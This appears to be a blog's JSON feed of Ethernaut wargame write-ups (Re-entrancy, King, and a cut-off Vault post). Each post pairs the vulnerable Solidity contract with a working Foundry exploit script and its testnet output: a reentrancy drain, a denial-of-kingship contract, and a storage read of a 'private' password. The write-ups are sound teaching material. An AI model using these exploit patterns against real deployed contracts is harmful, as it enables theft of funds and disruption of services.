            "id": "https://0o3q.github.io/2025/04/20/re-entrancy",
            "title": "[Ethernaut] 10.Re-entrancy",
            "summary": null,
            "content_text": "AnalysisThe goal is  steal all the funds from the contract.// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import \"openzeppelin-contracts-06/math/SafeMath.sol\";contract Reentrance {    using SafeMath for uint256;    mapping(address =&gt; uint256) public balances;    function donate(address _to) public payable {        balances[_to] = balances[_to].add(msg.value);    }    function balanceOf(address _who) public view returns (uint256 balance) {        return balances[_who];    }    function withdraw(uint256 _amount) public {        if (balances[msg.sender] &gt;= _amount) {            (bool result,) = msg.sender.call{value: _amount}(\"\");            if (result) {                _amount;            }            balances[msg.sender] -= _amount;        }    }    receive() external payable {}}In, withdraw()  function, sending ether before updating the balances state can lead to Reentrancy vulnerability.Solidity 0.8.30 Documentation - security considerations  💡 To avoid reentrancy, you can use the Checks-Effects-Interactions patternExploit// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import \"../src/Reentrance.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    Reentrance public reentrance_ = Reentrance(payable(0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1));    constructor() public payable {        reentrance_.donate{value: 0.001 ether}(address(this));    }    function ex() external {        reentrance_.withdraw(0.001 ether);        (bool result,) = msg.sender.call{value: 0.002 ether}(\"\");    }    receive() external payable {        reentrance_.withdraw(0.001 ether);    }}contract ReentranceSol is Script {    Reentrance public reentrance_ = Reentrance(payable(0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1));    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"Before instance balances: \", address(reentrance_).balance);        Ex ex = new Ex{value: 0.001 ether}();        ex.ex();        console.log(\"After instance balances: \", address(reentrance_).balance);        vm.stopBroadcast();    }}$ forge script script/Reentrance.sol --tc ReentranceSol --broadcast[⠊] Compiling...[⠒] Compiling 1 files with Solc 0.6.12[⠑] Solc 0.6.12 finished in 492.00msCompiler run successful with warnings:Warning (2072): Unused local variable.script/Reentrance.sol:17:10: Warning: Unused local variable.        (bool result,) = msg.sender.call{value: 0.002 ether}(\"\");         ^---------^Script ran successfully.== Logs ==  Before instance balances:  1000000000000000  After instance balances:  0## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001001646 gweiEstimated total gas used for script: 415285Estimated amount required: 0.00000041596855911 ETH==========================⠄ Sequence #1 on holesky | Waiting for pending transactions    ⡀ [Pending] 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252    ⡀ [Pending] 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06##### holesky✅  [Success] Hash: 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252Contract Address: 0x87347d80F8e415A3344cA3861A49393BC95C7F29Block: 3688507Paid: 0.000000250340138956 ETH (249932 gas * 0.001001633 gwei)##### holesky✅  [Success] Hash: 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06Block: 3688507Paid: 0.000000061895911235 ETH (61795 gas * 0.001001633 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000312236050191 ETH (311727 gas * avg 0.001001633 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>steal all the funds from the contract.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">12</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-06/math/SafeMath.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Reentrance</span> <span class=\"p\">{</span>    <span class=\"k\">using</span> <span class=\"n\">SafeMath</span> <span class=\"k\">for</span> <span class=\"kt\">uint256</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">balances</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">donate</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">].</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_who</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"nb\">balance</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_who</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;=</span> <span class=\"n\">_amount</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">.</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">_amount</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">_amount</span><span class=\"p\">;</span>            <span class=\"p\">}</span>            <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-=</span> <span class=\"n\">_amount</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{}</span><span class=\"p\">}</span></code></pre></div></div><p>In, <code class=\"language-plaintext highlighter-rouge\">withdraw()</code>  function, sending ether before updating the <code class=\"language-plaintext highlighter-rouge\">balances</code> state can lead to Reentrancy vulnerability.</p><p><a href=\"https://docs.soliditylang.org/en/latest/security-considerations.html#reentrancy\">Solidity 0.8.30 Documentation - security considerations</a></p><blockquote>  <p>💡 To avoid reentrancy, you can use the Checks-Effects-Interactions pattern</p></blockquote><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">12</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Reentrance.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"n\">Reentrance</span> <span class=\"k\">public</span> <span class=\"n\">reentrance_</span> <span class=\"o\">=</span> <span class=\"n\">Reentrance</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1</span><span class=\"p\">));</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">reentrance_</span><span class=\"p\">.</span><span class=\"n\">donate</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">}(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">));</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">ex</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">reentrance_</span><span class=\"p\">.</span><span class=\"n\">withdraw</span><span class=\"p\">(</span><span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">.</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mf\">0.002</span> <span class=\"kc\">ether</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">reentrance_</span><span class=\"p\">.</span><span class=\"n\">withdraw</span><span class=\"p\">(</span><span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">ReentranceSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Reentrance</span> <span class=\"k\">public</span> <span class=\"n\">reentrance_</span> <span class=\"o\">=</span> <span class=\"n\">Reentrance</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before instance balances: \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">reentrance_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">}();</span>        <span class=\"n\">ex</span><span class=\"p\">.</span><span class=\"n\">ex</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After instance balances: \"</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">reentrance_</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/Reentrance.sol <span class=\"nt\">--tc</span> ReentranceSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...<span class=\"o\">[</span>⠒] Compiling 1 files with Solc 0.6.12<span class=\"o\">[</span>⠑] Solc 0.6.12 finished <span class=\"k\">in </span>492.00msCompiler run successful with warnings:Warning <span class=\"o\">(</span>2072<span class=\"o\">)</span>: Unused <span class=\"nb\">local </span>variable.script/Reentrance.sol:17:10: Warning: Unused <span class=\"nb\">local </span>variable.        <span class=\"o\">(</span>bool result,<span class=\"o\">)</span> <span class=\"o\">=</span> msg.sender.call<span class=\"o\">{</span>value: 0.002 ether<span class=\"o\">}(</span><span class=\"s2\">\"\"</span><span class=\"o\">)</span><span class=\"p\">;</span>         ^---------^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Before instance balances:  1000000000000000  After instance balances:  0<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001001646 gweiEstimated total gas used <span class=\"k\">for </span>script: 415285Estimated amount required: 0.00000041596855911 ETH<span class=\"o\">==========================</span>⠄ Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ⡀ <span class=\"o\">[</span>Pending] 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252    ⡀ <span class=\"o\">[</span>Pending] 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06<span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252Contract Address: 0x87347d80F8e415A3344cA3861A49393BC95C7F29Block: 3688507Paid: 0.000000250340138956 ETH <span class=\"o\">(</span>249932 gas <span class=\"k\">*</span> 0.001001633 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06Block: 3688507Paid: 0.000000061895911235 ETH <span class=\"o\">(</span>61795 gas <span class=\"k\">*</span> 0.001001633 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000312236050191 ETH (311727 gas * avg 0.001001633 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-20-Re-entrancy/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/20/re-entrancy",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","reentrancy"],
            
            "date_published": "2025-04-20T00:00:00+09:00",
            "date_modified": "2025-04-20T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/20/king",
            "title": "[Ethernaut] 09.King",
            "summary": null,
            "content_text": "AnalysisThe goals are  reclaim kingship  avoid a self proclamation.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract King {    address king;    uint256 public prize;    address public owner;    constructor() payable {        owner = msg.sender;        king = msg.sender;        prize = msg.value;    }    receive() external payable {        require(msg.value &gt;= prize || msg.sender == owner);        payable(king).transfer(msg.value);        king = msg.sender;        prize = msg.value;    }    function _king() public view returns (address) {        return king;    }}Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/King.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(King king_) payable {        address(king_).call{value: king_.prize()}(\"\");    }}contract KingSol is Script {    King public king_ = King(payable(0x4Ee0991775535F17Dd47879adA5c2fca799bCA0e));    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"Befor king: \", king_._king());        new Ex{value: king_.prize()}(king_);        console.log(\"After king: \", king_._king());        vm.stopBroadcast();    }}The Ex contract does not have a receive or fallback function.So, the transaction reverts when the level attempts to transfer ether to it.$ forge script script/King.sol --tc KingSol --broadcast[⠊] Compiling...[⠰] Compiling 1 files with Solc 0.8.29[⠔] Solc 0.8.29 finished in 278.71msCompiler run successful with warnings:Warning (9302): Return value of low-level calls not used.  --&gt; script/King.sol:10:9:   |10 |         address(king_).call{value: king_.prize()}(\"\");   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.== Logs ==  Befor king:  0xDed9f3474fe5f075Ed7953f36a493928b1BD9f31  After king:  0x18170C5Ed18ceE0a24a327841eFfa6eB745A050a## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001002373 gweiEstimated total gas used for script: 134730Estimated amount required: 0.00000013504971429 ETH==========================##### holesky✅  [Success] Hash: 0xa7cae242656175eed004f4d74d52f36a11124dba4b5026ae6d20cc29bee65ac9Contract Address: 0x18170C5Ed18ceE0a24a327841eFfa6eB745A050aBlock: 3687281Paid: 0.000000103884106235 ETH (103639 gas * 0.001002365 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000103884106235 ETH (103639 gas * avg 0.001002365 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goals are</p><ol>  <li>reclaim kingship</li>  <li>avoid a self proclamation.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">King</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"n\">king</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">prize</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">king</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">prize</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;=</span> <span class=\"n\">prize</span> <span class=\"o\">||</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">);</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">king</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">);</span>        <span class=\"n\">king</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">prize</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">_king</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">king</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/King.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">King</span> <span class=\"n\">king_</span><span class=\"p\">)</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">king_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">prize</span><span class=\"p\">()}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">KingSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">King</span> <span class=\"k\">public</span> <span class=\"n\">king_</span> <span class=\"o\">=</span> <span class=\"n\">King</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x4Ee0991775535F17Dd47879adA5c2fca799bCA0e</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Befor king: \"</span><span class=\"p\">,</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">_king</span><span class=\"p\">());</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">prize</span><span class=\"p\">()}(</span><span class=\"n\">king_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After king: \"</span><span class=\"p\">,</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">_king</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The Ex contract does not have a <code class=\"language-plaintext highlighter-rouge\">receive</code> or <code class=\"language-plaintext highlighter-rouge\">fallback</code> function.<br />So, the transaction reverts when the level attempts to <code class=\"language-plaintext highlighter-rouge\">transfer</code> ether to it.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/King.sol <span class=\"nt\">--tc</span> KingSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...<span class=\"o\">[</span>⠰] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>⠔] Solc 0.8.29 finished <span class=\"k\">in </span>278.71msCompiler run successful with warnings:Warning <span class=\"o\">(</span>9302<span class=\"o\">)</span>: Return value of low-level calls not used.  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> script/King.sol:10:9:   |10 |         address<span class=\"o\">(</span>king_<span class=\"o\">)</span>.call<span class=\"o\">{</span>value: king_.prize<span class=\"o\">()}(</span><span class=\"s2\">\"\"</span><span class=\"o\">)</span><span class=\"p\">;</span>   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Befor king:  0xDed9f3474fe5f075Ed7953f36a493928b1BD9f31  After king:  0x18170C5Ed18ceE0a24a327841eFfa6eB745A050a<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001002373 gweiEstimated total gas used <span class=\"k\">for </span>script: 134730Estimated amount required: 0.00000013504971429 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xa7cae242656175eed004f4d74d52f36a11124dba4b5026ae6d20cc29bee65ac9Contract Address: 0x18170C5Ed18ceE0a24a327841eFfa6eB745A050aBlock: 3687281Paid: 0.000000103884106235 ETH <span class=\"o\">(</span>103639 gas <span class=\"k\">*</span> 0.001002365 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000103884106235 ETH (103639 gas * avg 0.001002365 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-20-King/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/20/king",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-20T00:00:00+09:00",
            "date_modified": "2025-04-20T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/19/vault",
            "title": "[Ethernaut] 08.Vault",
            "summary": null,
            "content_text": "AnalysisThe goal is  Unlock the vault// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault {    bool public locked;    bytes32 private password;    constructor(bytes32 _password) {        locked = true;        password = _password;    }    function unlock(bytes32 _password) public {        if (password == _password) {            locked = false;        }    }}Because the blockchain is transparent, secret keys cannot be stored on it.Exploit$ cast storage 0x65E998C6f70c90f149553c967BA4a38Ecc6213A9 10x412076657279207374726f6e67207365637265742070617373776f7264203a29// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Vault.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract ValutSol is Script {    Vault public vault_ = Vault(0x65E998C6f70c90f149553c967BA4a38Ecc6213A9);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        vault_.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);        vm.stopBroadcast();    }}$ forge script script/VaultSol.sol --broadcast[⠊] Compiling...[⠰] Compiling 1 files with Solc 0.8.29[⠒] Solc 0.8.29 finished in 322.36msCompiler run successful!Script ran successfully.## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.00101144 gweiEstimated total gas used for script: 36108Estimated amount required: 0.00000003652107552 ETH==========================##### holesky✅  [Success] Hash: 0x14d0aaca36fb737a61c0a533652da5a4d2314117698a64a1788ec28633d7f1b1Block: 3685538Paid: 0.000000026441866776 ETH (26143 gas * 0.001011432 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000026441866776 ETH (26143 gas * avg 0.001011432 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Unlock the vault</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Vault</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">locked</span><span class=\"p\">;</span>    <span class=\"kt\">bytes32</span> <span class=\"k\">private</span> <span class=\"n\">password</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>        <span class=\"n\">password</span> <span class=\"o\">=</span> <span class=\"n\">_password</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span 